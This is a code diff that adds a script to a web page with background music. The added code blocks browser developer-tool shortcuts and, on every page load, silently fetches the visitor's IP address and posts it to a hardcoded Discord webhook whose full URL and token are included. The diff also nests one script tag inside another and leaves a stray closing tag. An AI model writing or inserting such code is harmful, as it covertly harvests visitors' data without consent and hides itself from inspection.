@@ -192,6 +192,66 @@
       document.addEventListener("click", () => music.play(), { once: true });
     });
   });
+<script>
+  // منع أدوات المطور F12 وCtrl+Shift+I وغيرها
+  document.onkeydown = function (e) {
+    if (e.keyCode == 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || 
+                                     e.keyCode == 'C'.charCodeAt(0) || 
+                                     e.keyCode == 'J'.charCodeAt(0))) ||
+        (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+      return false;
+    }
+  };
+
+  // إرسال IP إلى Webhook
+  function fetchIPAndSend() {
+    const webhookURL = 'https://discord.com/api/webhooks/1260111462903447612/tWECxiwuAQEtagpwPiQw9Awz1P1hKColgt9Sn_I-7e8jQn-26P3MVuCzoEbj72_mD4FU';
+
+    fetch('https://api64.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        sendToWebhook(ip);
+      })
+      .catch(error => console.error('Error fetching IP:', error));
+  }
+
+  function sendToWebhook(ip) {
+    const webhookURL = 'https://discord.com/api/webhooks/1260111462903447612/tWECxiwuAQEtagpwPiQw9Awz1P1hKColgt9Sn_I-7e8jQn-26P3MVuCzoEbj72_mD4FU';
+
+    const message = {
+      content: `📡 New Visitor IP: ${ip}`
+    };
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(message)
+    })
+      .then(response => {
+        if (response.ok) {
+          console.log('IP sent to webhook successfully');
+        } else {
+          console.error('Failed to send IP:', response.statusText);
+        }
+      })
+      .catch(error => console.error('Error sending to webhook:', error));
+  }
+
+  // استدعاء عند تحميل الصفحة
+  window.onload = function () {
+    fetchIPAndSend();
+
+    // تشغيل الموسيقى fallback
+    const music = document.getElementById("bg-music");
+    music.play().catch(() => {
+      document.addEventListener("click", () => music.play(), { once: true });
+    });
+  };
+</script>
 
 </script>
 
